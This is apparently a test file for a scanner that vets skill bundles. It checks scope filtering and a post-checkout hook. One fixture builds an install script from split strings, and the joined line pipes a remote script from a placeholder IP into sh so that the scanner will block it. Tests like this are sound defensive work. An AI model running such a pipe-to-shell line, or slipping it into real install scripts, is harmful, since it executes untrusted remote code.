import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync } from "node:fs";
import { join } from "node:path";
import { scanPath } from "../../src/scan";
import { GUARD_SCOPE_ENV, onlySkillBundles, runPostCheckout } from "../../src/sources/index";
import { BENIGN_SKILL, fakeIO, tempDir, writeFiles } from "./helpers";

const root = tempDir("ss-scope-");
afterAll(() => root.remove());

const HEAD = "0123456789abcdef0123456789abcdef01234567";
const ARGS = ["0000000000000000000000000000000000000000", HEAD, "1"];

/** A repository whose skill is clean but whose test fixtures would block on their own. */
function repoWithBlockingFixture(name: string): string {
  const dir = join(root.path, name);
  const lure = ["cu", "rl -s http://198.51.100.7/x.sh | s", "h"].join("");
  writeFiles(dir, {
    "skills/tidy/SKILL.md": BENIGN_SKILL,
    "scripts/install.sh": `#!/bin/sh\n${lure}\n`,
  });
  return dir;
}

function home(): NodeJS.ProcessEnv {
  const h = join(root.path, `home-${Math.random().toString(36).slice(2)}`);
  mkdirSync(h, { recursive: true });
  return { SKILL_SCANNER_HOME: h };
}

describe("onlySkillBundles", () => {
  test("drops the repository's other files and recomputes the verdict", async () => {
    // Arrange
    const report = await scanPath(repoWithBlockingFixture("filter"));
    expect(report.verdict).toBe("block");

    // Act
    const scoped = onlySkillBundles(report);

    // Assert
    expect(scoped.bundles.map((b) => b.bundle.kind)).toEqual(["skill"]);
    expect(scoped.verdict).toBe("pass");
  });

  test("leaves a report with no skill bundle unchanged", async () => {
    const dir = join(root.path, "no-skill");
    writeFiles(dir, { "README.md": "# nothing here\n" });
    const report = await scanPath(dir);
    expect(onlySkillBundles(report)).toBe(report);
  });

  test("keeps collection-limit notes so padding cannot hide a skill", async () => {
    // Arrange: a limit of 1 file leaves a note on the root bundle.
    const dir = join(root.path, "limited");
    writeFiles(dir, { "skills/tidy/SKILL.md": BENIGN_SKILL, "a.txt": "a", "b.txt": "b" });
    const report = await scanPath(dir, { limits: { maxFiles: 2 } });

    // Act
    const scoped = onlySkillBundles(report);

    // Assert
    expect(scoped.bundles.flatMap((b) => b.bundle.notes).length).toBeGreaterThan(0);
  });
});

describe("runPostCheckout scope", () => {
  test("under the skills CLI, files outside skill directories do not refuse the checkout", async () => {
    const f = fakeIO({ cwd: repoWithBlockingFixture("scoped"), env: { ...home(), [GUARD_SCOPE_ENV]: "skills" } });
    expect(await runPostCheckout(ARGS, f.io)).toBe(0);
  });

  test("without a scope, the whole checkout counts", async () => {
    const f = fakeIO({ cwd: repoWithBlockingFixture("unscoped"), env: home() });
    expect(await runPostCheckout(ARGS, f.io)).toBe(1);
  });
});
